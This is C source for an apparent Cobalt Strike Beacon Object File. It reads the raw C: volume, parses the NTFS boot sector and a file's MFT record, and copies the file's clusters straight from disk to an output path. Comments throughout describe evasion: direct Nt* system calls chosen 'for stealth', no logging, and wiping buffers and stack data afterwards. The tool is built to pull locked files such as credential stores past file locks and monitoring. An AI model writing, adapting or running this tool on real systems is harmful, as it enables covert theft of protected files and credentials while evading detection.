#include <windows.h>
#include <stdint.h>
#include "../_include/beacon.h"
#include "../_include/bofdefs.h"

// NTFS Constants
#define MFT_RECORD_SIZE 1024
// FILE_READ_ATTRIBUTES and FILE_FLAG_BACKUP_SEMANTICS are already defined in windows.h
#define FILE_SHARE_READ 0x00000001
#define FILE_SHARE_WRITE 0x00000002
#define FILE_SHARE_DELETE 0x00000004
#define OPEN_EXISTING 3

// NTSTATUS helper
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

// NtCreateFile constants (if not defined)
#ifndef FILE_READ_DATA
#define FILE_READ_DATA 0x0001
#endif
#ifndef FILE_WRITE_DATA
#define FILE_WRITE_DATA 0x0002
#endif
#ifndef FILE_OPEN
#define FILE_OPEN 1
#endif
#ifndef FILE_OVERWRITE_IF
#define FILE_OVERWRITE_IF 5
#endif
#ifndef FILE_SYNCHRONOUS_IO_NONALERT
#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000020
#endif
#ifndef FILE_NON_DIRECTORY_FILE
#define FILE_NON_DIRECTORY_FILE 0x00000040
#endif
#ifndef OBJ_CASE_INSENSITIVE
#define OBJ_CASE_INSENSITIVE 0x00000040L
#endif

// NTFS Attribute Types
#define ATTRIBUTE_END 0xFFFFFFFF
#define ATTRIBUTE_FILE_NAME 0x30
#define ATTRIBUTE_DATA 0x80

// NTFS Boot Sector offsets
#define BOOT_BYTES_PER_SECTOR 11
#define BOOT_SECTORS_PER_CLUSTER 13
#define BOOT_MFT_CLUSTER 48

// Data Run structure
typedef struct {
    ULONGLONG lcn;
    ULONGLONG length;
} DATA_RUN;

// NTFS Boot Sector structure
typedef struct {
    WORD bytesPerSector;
    BYTE sectorsPerCluster;
    DWORD clusterSize;
    ULONGLONG mftCluster;
} NTFS_BOOT;

// File Info structure
typedef struct {
    ULONGLONG fileSize;
    ULONGLONG mftRecordNumber;
    DATA_RUN* runs;
    int runCount;
    BOOL hasRuns;
    BOOL isResident;
    BYTE* residentData;
    DWORD residentDataSize;
} FILE_INFO;

// Helper function to read NTFS boot sector (stealth mode - no logging)
BOOL ReadNtfsBoot(HANDLE hVolume, NTFS_BOOT* boot) {
    BYTE buffer[512];
    IO_STATUS_BLOCK ioStatus;
    LARGE_INTEGER offset;
    NTSTATUS status;
    offset.QuadPart = 0;

    // Use direct NtReadFile for stealth
    status = NTDLL$NtReadFile(
        hVolume,
        NULL,
        NULL,
        NULL,
        &ioStatus,
        buffer,
        512,
        &offset,
        NULL
    );

    if (!NT_SUCCESS(status) || ioStatus.Information != 512) {
        return FALSE;
    }

    boot->bytesPerSector = *(WORD*)(buffer + BOOT_BYTES_PER_SECTOR);
    boot->sectorsPerCluster = buffer[BOOT_SECTORS_PER_CLUSTER];
    boot->clusterSize = boot->bytesPerSector * boot->sectorsPerCluster;
    boot->mftCluster = *(ULONGLONG*)(buffer + BOOT_MFT_CLUSTER);

    // Clear buffer from memory
    MSVCRT$memset(buffer, 0, sizeof(buffer));

    return TRUE;
}

// Get file information using GetFileInformationByHandle
BOOL GetNtfsFileInfo(LPCWSTR filePath, ULONGLONG* mftRecordNumber, ULONGLONG* fileSize) {
    HANDLE hFile = INVALID_HANDLE_VALUE;
    BY_HANDLE_FILE_INFORMATION fileInfo;
    WCHAR normalizedPath[MAX_PATH * 2];
    BOOL result = FALSE;

    // Normalize path with \\?\ prefix
    if (filePath[0] != L'\\' || filePath[1] != L'\\' || filePath[2] != L'?' || filePath[3] != L'\\') {
        normalizedPath[0] = L'\\';
        normalizedPath[1] = L'\\';
        normalizedPath[2] = L'?';
        normalizedPath[3] = L'\\';
        int pathLen = KERNEL32$lstrlenW(filePath);
        MSVCRT$memcpy(normalizedPath + 4, filePath, (pathLen + 1) * sizeof(WCHAR));
    } else {
        int pathLen = KERNEL32$lstrlenW(filePath);
        MSVCRT$memcpy(normalizedPath, filePath, (pathLen + 1) * sizeof(WCHAR));
    }

    hFile = KERNEL32$CreateFileW(
        normalizedPath,
        FILE_READ_ATTRIBUTES,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL,
        OPEN_EXISTING,
        FILE_FLAG_BACKUP_SEMANTICS,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    if (!KERNEL32$GetFileInformationByHandle(hFile, &fileInfo)) {
        KERNEL32$CloseHandle(hFile);
        return FALSE;
    }

    // Extract MFT record number from FileIndex
    ULONGLONG frn = ((ULONGLONG)fileInfo.nFileIndexHigh << 32) | fileInfo.nFileIndexLow;
    *mftRecordNumber = frn & 0x0000FFFFFFFFFFFF;
    *fileSize = ((ULONGLONG)fileInfo.nFileSizeHigh << 32) | fileInfo.nFileSizeLow;

    KERNEL32$CloseHandle(hFile);
    return TRUE;
}

// Read MFT record (using direct NtReadFile for stealth)
BOOL ReadMftRecord(HANDLE hVolume, NTFS_BOOT* boot, ULONGLONG recordNumber, BYTE* record) {
    ULONGLONG mftOffset = boot->mftCluster * boot->clusterSize;
    ULONGLONG recordOffset = mftOffset + (recordNumber * MFT_RECORD_SIZE);
    LARGE_INTEGER offset;
    IO_STATUS_BLOCK ioStatus;
    NTSTATUS status;

    offset.QuadPart = recordOffset;

    // Use direct NtReadFile for stealth
    status = NTDLL$NtReadFile(
        hVolume,
        NULL,
        NULL,
        NULL,
        &ioStatus,
        record,
        MFT_RECORD_SIZE,
        &offset,
        NULL
    );

    if (!NT_SUCCESS(status) || ioStatus.Information != MFT_RECORD_SIZE) {
        return FALSE;
    }

    return TRUE;
}

// Parse data runs from $DATA attribute
int ParseDataRuns(BYTE* dataRuns, int dataRunsSize, DATA_RUN** runs, NTFS_BOOT* boot) {
    int pos = 0;
    ULONGLONG currentLCN = 0;
    int runCount = 0;
    DATA_RUN* runArray = NULL;
    int arraySize = 0;

    while (pos < dataRunsSize && dataRuns[pos] != 0x00) {
        BYTE header = dataRuns[pos++];
        BYTE lenSize = header & 0x0F;
        BYTE offSize = (header >> 4) & 0x0F;

        if (lenSize == 0 || lenSize > 8 || offSize > 8) {
            break;
        }

        // Read length
        ULONGLONG length = 0;
        int i;
        for (i = 0; i < lenSize; i++) {
            length |= ((ULONGLONG)dataRuns[pos++]) << (8 * i);
        }

        // Read offset (relative LCN)
        ULONGLONG offset = 0;
        if (offSize > 0) {
            for (i = 0; i < offSize; i++) {
                offset |= ((ULONGLONG)dataRuns[pos++]) << (8 * i);
            }
            // Two's complement sign extension
            if (offSize < 8 && (dataRuns[pos - 1] & 0x80)) {
                ULONGLONG signExtend = ((ULONGLONG)0xFFFFFFFFFFFFFFFF) << (8 * offSize);
                offset |= signExtend;
            }
        }

        currentLCN += offset;

        // Reallocate array if needed
        if (runCount >= arraySize) {
            arraySize = arraySize == 0 ? 16 : arraySize * 2;
            DATA_RUN* newArray = (DATA_RUN*)intAlloc(sizeof(DATA_RUN) * arraySize);
            if (runArray) {
                MSVCRT$memcpy(newArray, runArray, sizeof(DATA_RUN) * runCount);
                intFree(runArray);
            }
            runArray = newArray;
        }

        runArray[runCount].lcn = currentLCN;
        runArray[runCount].length = length;
        runCount++;
    }

    *runs = runArray;
    return runCount;
}

// Get file info from MFT record
BOOL GetFileInfoFromRecord(BYTE* record, FILE_INFO* fileInfo, NTFS_BOOT* boot) {
    WORD attrOffset = *(WORD*)(record + 20);
    fileInfo->hasRuns = FALSE;
    fileInfo->isResident = FALSE;
    fileInfo->runs = NULL;
    fileInfo->runCount = 0;
    fileInfo->residentData = NULL;
    fileInfo->residentDataSize = 0;

    while (attrOffset < MFT_RECORD_SIZE) {
        DWORD attrType = *(DWORD*)(record + attrOffset);
        if (attrType == ATTRIBUTE_END) {
            break;
        }

        DWORD attrLength = *(DWORD*)(record + attrOffset + 4);
        if (attrLength == 0 || attrOffset + attrLength > MFT_RECORD_SIZE) {
            break;
        }

        BYTE nonResident = record[attrOffset + 8];

        // Handle $DATA attribute
        if (attrType == ATTRIBUTE_DATA) {
            if (nonResident == 0) {
                // Resident data
                fileInfo->isResident = TRUE;
                fileInfo->fileSize = *(ULONGLONG*)(record + attrOffset + 16);
                WORD valueOffset = *(WORD*)(record + attrOffset + 20);
                fileInfo->residentDataSize = (DWORD)fileInfo->fileSize;
                fileInfo->residentData = (BYTE*)intAlloc(fileInfo->residentDataSize);
                MSVCRT$memcpy(fileInfo->residentData, record + attrOffset + valueOffset, fileInfo->residentDataSize);
            } else {
                // Non-resident data
                fileInfo->isResident = FALSE;
                fileInfo->fileSize = *(ULONGLONG*)(record + attrOffset + 48);
                WORD dataRunsOffset = *(WORD*)(record + attrOffset + 32);
                int dataRunsSize = attrLength - dataRunsOffset;
                BYTE* dataRuns = record + attrOffset + dataRunsOffset;

                fileInfo->runCount = ParseDataRuns(dataRuns, dataRunsSize, &fileInfo->runs, boot);
                fileInfo->hasRuns = (fileInfo->runCount > 0);
            }
            break;
        }

        attrOffset += attrLength;
    }

    return TRUE;
}

// Copy file by extents (MFT mode) - stealth implementation
BOOL CopyFileByMft(HANDLE hVolume, HANDLE hOutput, FILE_INFO* fileInfo, NTFS_BOOT* boot) {
    ULONGLONG bytesWritten = 0;
    BYTE* buffer = NULL;
    DWORD bufferSize = 64 * 1024; // 64KB buffer for stealth (smaller = less memory footprint)
    IO_STATUS_BLOCK ioStatus;
    NTSTATUS status;

    buffer = (BYTE*)intAlloc(bufferSize);
    if (!buffer) {
        return FALSE;
    }

    if (fileInfo->isResident) {
        // Copy resident data using NtWriteFile for stealth
        LARGE_INTEGER writeOffset;
        writeOffset.QuadPart = 0;
        status = NTDLL$NtWriteFile(
            hOutput,
            NULL,
            NULL,
            NULL,
            &ioStatus,
            fileInfo->residentData,
            fileInfo->residentDataSize,
            &writeOffset,
            NULL
        );
        if (!NT_SUCCESS(status)) {
            intFree(buffer);
            return FALSE;
        }
        bytesWritten = ioStatus.Information;
    } else if (fileInfo->hasRuns) {
        // Copy non-resident data
        int i;
        for (i = 0; i < fileInfo->runCount; i++) {
            ULONGLONG toRead = fileInfo->runs[i].length * boot->clusterSize;
            ULONGLONG remaining = fileInfo->fileSize - bytesWritten;
            if (toRead > remaining) {
                toRead = remaining;
            }
            if (toRead == 0) {
                break;
            }

            if (fileInfo->runs[i].lcn == 0) {
                // Sparse cluster - write zeros using NtWriteFile
                MSVCRT$memset(buffer, 0, (size_t)toRead);
                LARGE_INTEGER writeOffset;
                writeOffset.QuadPart = bytesWritten;
                status = NTDLL$NtWriteFile(
                    hOutput,
                    NULL,
                    NULL,
                    NULL,
                    &ioStatus,
                    buffer,
                    (ULONG)toRead,
                    &writeOffset,
                    NULL
                );
                if (!NT_SUCCESS(status)) {
                    intFree(buffer);
                    return FALSE;
                }
                bytesWritten += ioStatus.Information;
                continue;
            }

            ULONGLONG diskOffset = fileInfo->runs[i].lcn * boot->clusterSize;
            LARGE_INTEGER readOffset;
            readOffset.QuadPart = diskOffset;

            ULONGLONG copied = 0;
            while (copied < toRead) {
                ULONG chunkSize = (ULONG)((toRead - copied > bufferSize) ? bufferSize : (toRead - copied));
                
                // Use NtReadFile for stealth
                readOffset.QuadPart = diskOffset + copied;
                status = NTDLL$NtReadFile(
                    hVolume,
                    NULL,
                    NULL,
                    NULL,
                    &ioStatus,
                    buffer,
                    chunkSize,
                    &readOffset,
                    NULL
                );
                
                if (!NT_SUCCESS(status) || ioStatus.Information == 0) {
                    break;
                }

                // Use NtWriteFile for stealth
                LARGE_INTEGER writeOffset;
                writeOffset.QuadPart = bytesWritten;
                status = NTDLL$NtWriteFile(
                    hOutput,
                    NULL,
                    NULL,
                    NULL,
                    &ioStatus,
                    buffer,
                    (ULONG)ioStatus.Information,
                    &writeOffset,
                    NULL
                );

                if (!NT_SUCCESS(status)) {
                    intFree(buffer);
                    return FALSE;
                }

                copied += ioStatus.Information;
                bytesWritten += ioStatus.Information;
                
                // Clear buffer after each write for stealth
                MSVCRT$memset(buffer, 0, bufferSize);
            }

            if (bytesWritten >= fileInfo->fileSize) {
                break;
            }
        }
    }

    // Clear buffer before freeing
    MSVCRT$memset(buffer, 0, bufferSize);
    intFree(buffer);
    return TRUE;
}

// Main function
void go(char* args, int len) {
    datap parser;
    char* mode = NULL;
    char* sourceFile = NULL;
    char* destFile = NULL;
    WCHAR* sourceFileW = NULL;
    WCHAR* destFileW = NULL;
    HANDLE hVolume = INVALID_HANDLE_VALUE;
    HANDLE hOutput = INVALID_HANDLE_VALUE;
    NTFS_BOOT boot = {0};
    FILE_INFO fileInfo = {0};
    BYTE* mftRecord = NULL;
    ULONGLONG mftRecordNumber = 0;
    ULONGLONG fileSize = 0;
    BOOL success = FALSE;

    BeaconDataParse(&parser, args, len);
    mode = BeaconDataExtract(&parser, NULL);
    sourceFile = BeaconDataExtract(&parser, NULL);
    destFile = BeaconDataExtract(&parser, NULL);

    if (!mode || !sourceFile || !destFile) {
        return;
    }

    // Convert to wide char
    int sourceLen = MSVCRT$strlen(sourceFile) + 1;
    int destLen = MSVCRT$strlen(destFile) + 1;
    sourceFileW = (WCHAR*)intAlloc(sourceLen * sizeof(WCHAR));
    destFileW = (WCHAR*)intAlloc(destLen * sizeof(WCHAR));

    KERNEL32$MultiByteToWideChar(CP_ACP, 0, sourceFile, -1, sourceFileW, sourceLen);
    KERNEL32$MultiByteToWideChar(CP_ACP, 0, destFile, -1, destFileW, destLen);

    // Open volume using NtCreateFile for stealth (hardcoded to C: for now)
    OBJECT_ATTRIBUTES objAttr;
    UNICODE_STRING volumePath;
    IO_STATUS_BLOCK ioStatus;
    NTSTATUS status;
    
    WCHAR volumeName[] = L"\\??\\C:";
    NTDLL$RtlInitUnicodeString(&volumePath, volumeName);
    
    objAttr.Length = sizeof(OBJECT_ATTRIBUTES);
    objAttr.RootDirectory = NULL;
    objAttr.ObjectName = &volumePath;
    objAttr.Attributes = OBJ_CASE_INSENSITIVE;
    objAttr.SecurityDescriptor = NULL;
    objAttr.SecurityQualityOfService = NULL;
    
    status = NTDLL$NtCreateFile(
        &hVolume,
        FILE_READ_DATA | SYNCHRONIZE,
        &objAttr,
        &ioStatus,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0
    );

    if (!NT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to open volume: 0x%08X\n", status);
        goto cleanup;
    }

    // Read NTFS boot sector
    if (!ReadNtfsBoot(hVolume, &boot)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to read NTFS boot sector\n");
        goto cleanup;
    }

    if (MSVCRT$strcmp(mode, "MFT") == 0) {
        // MFT mode
        if (!GetNtfsFileInfo(sourceFileW, &mftRecordNumber, &fileSize)) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to get file info from source\n");
            goto cleanup;
        }

        mftRecord = (BYTE*)intAlloc(MFT_RECORD_SIZE);
        if (!mftRecord) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate MFT record buffer\n");
            goto cleanup;
        }

        if (!ReadMftRecord(hVolume, &boot, mftRecordNumber, mftRecord)) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to read MFT record\n");
            goto cleanup;
        }

        if (!GetFileInfoFromRecord(mftRecord, &fileInfo, &boot)) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to parse file info from MFT record\n");
            goto cleanup;
        }

        fileInfo.fileSize = fileSize; // Use actual file size

        // Create output file using NtCreateFile for stealth
        // First, get full path
        WCHAR fullDestPath[MAX_PATH * 2];
        WCHAR* filePart = NULL;
        DWORD fullPathLen = KERNEL32$GetFullPathNameW(destFileW, MAX_PATH * 2, fullDestPath, &filePart);
        
        if (fullPathLen == 0 || fullPathLen >= MAX_PATH * 2) {
            // Fallback to original path if GetFullPathNameW fails
            fullPathLen = KERNEL32$lstrlenW(destFileW);
            MSVCRT$memcpy(fullDestPath, destFileW, (fullPathLen + 1) * sizeof(WCHAR));
        }
        
        // Normalize path with \??\ prefix for NtCreateFile (not \\?\)
        WCHAR normalizedDestPath[MAX_PATH * 2];
        int destPathLen = fullPathLen;
        
        // Check if already has \??\ or \\?\ prefix
        if ((fullDestPath[0] == L'\\' && fullDestPath[1] == L'\\' && fullDestPath[2] == L'?' && fullDestPath[3] == L'\\') ||
            (fullDestPath[0] == L'\\' && fullDestPath[1] == L'?' && fullDestPath[2] == L'?' && fullDestPath[3] == L'\\')) {
            // Already normalized, but convert \\?\ to \??\ if needed
            if (fullDestPath[1] == L'\\') {
                normalizedDestPath[0] = L'\\';
                normalizedDestPath[1] = L'?';
                normalizedDestPath[2] = L'?';
                normalizedDestPath[3] = L'\\';
                MSVCRT$memcpy(normalizedDestPath + 4, fullDestPath + 4, (destPathLen - 3) * sizeof(WCHAR));
            } else {
                MSVCRT$memcpy(normalizedDestPath, fullDestPath, (destPathLen + 1) * sizeof(WCHAR));
            }
        } else {
            // Add \??\ prefix
            normalizedDestPath[0] = L'\\';
            normalizedDestPath[1] = L'?';
            normalizedDestPath[2] = L'?';
            normalizedDestPath[3] = L'\\';
            MSVCRT$memcpy(normalizedDestPath + 4, fullDestPath, (destPathLen + 1) * sizeof(WCHAR));
            destPathLen += 4;
        }
        
        OBJECT_ATTRIBUTES objAttr;
        UNICODE_STRING outputPath;
        IO_STATUS_BLOCK ioStatus;
        
        // Use RtlInitUnicodeString for proper initialization
        NTDLL$RtlInitUnicodeString(&outputPath, normalizedDestPath);
        
        objAttr.Length = sizeof(OBJECT_ATTRIBUTES);
        objAttr.RootDirectory = NULL;
        objAttr.ObjectName = &outputPath;
        objAttr.Attributes = OBJ_CASE_INSENSITIVE;
        objAttr.SecurityDescriptor = NULL;
        objAttr.SecurityQualityOfService = NULL;
        
        status = NTDLL$NtCreateFile(
            &hOutput,
            FILE_WRITE_DATA | SYNCHRONIZE,
            &objAttr,
            &ioStatus,
            NULL,
            FILE_ATTRIBUTE_NORMAL,
            0,
            FILE_OVERWRITE_IF,
            FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
            NULL,
            0
        );

        if (!NT_SUCCESS(status)) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to create output file: 0x%08X\n", status);
            goto cleanup;
        }

        if (!CopyFileByMft(hVolume, hOutput, &fileInfo, &boot)) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to copy file data\n");
            goto cleanup;
        }

        success = TRUE;
        BeaconPrintf(CALLBACK_OUTPUT, "[+] File copied successfully: %llu bytes\n", fileSize);
    }

cleanup:
    // Clean up handles using NtClose for stealth
    if (hVolume != INVALID_HANDLE_VALUE) {
        NTDLL$NtClose(hVolume);
    }
    if (hOutput != INVALID_HANDLE_VALUE) {
        NTDLL$NtClose(hOutput);
    }
    
    // Securely clear and free memory
    if (mftRecord) {
        MSVCRT$memset(mftRecord, 0, MFT_RECORD_SIZE);
        intFree(mftRecord);
    }
    if (fileInfo.runs) {
        MSVCRT$memset(fileInfo.runs, 0, sizeof(DATA_RUN) * fileInfo.runCount);
        intFree(fileInfo.runs);
    }
    if (fileInfo.residentData) {
        MSVCRT$memset(fileInfo.residentData, 0, fileInfo.residentDataSize);
        intFree(fileInfo.residentData);
    }
    if (sourceFileW) {
        MSVCRT$memset(sourceFileW, 0, sourceLen * sizeof(WCHAR));
        intFree(sourceFileW);
    }
    if (destFileW) {
        MSVCRT$memset(destFileW, 0, destLen * sizeof(WCHAR));
        intFree(destFileW);
    }
    
    // Clear sensitive data from stack
    MSVCRT$memset(&boot, 0, sizeof(boot));
    MSVCRT$memset(&fileInfo, 0, sizeof(fileInfo));
}

